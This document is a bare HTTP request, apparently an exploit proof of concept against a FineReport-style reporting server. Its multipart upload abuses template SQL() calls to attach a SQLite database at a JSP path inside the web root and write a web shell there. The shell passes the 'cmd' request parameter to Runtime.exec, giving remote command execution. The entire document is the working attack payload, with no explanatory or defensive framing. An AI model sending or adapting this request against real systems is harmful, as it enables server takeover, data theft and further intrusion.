POST /webroot/decision/view/form?op=fr_attach&cmd=aH_upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9nWtz5kBq3EiN5Jp
Connection: close

------WebKitFormBoundary9nWtz5kBq3EiN5Jp
Content-Disposition: form-data; name="file"; filename="a"
Content-Type: text/xml

${SQL("FRDemo","	ATTACH DATABASE '../webapps/webroot/ctc.jsp' as psox;",1,1)}
${SQL("FRDemo","	CREATE TABLE psox.exp(data text);",1,1)}
${SQL("FRDemo","	INSERT INTO psox.exp(data) VALUES ('<%out.println(\"hallo\");Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>');",1,1)}
------WebKitFormBoundary9nWtz5kBq3EiN5Jp--
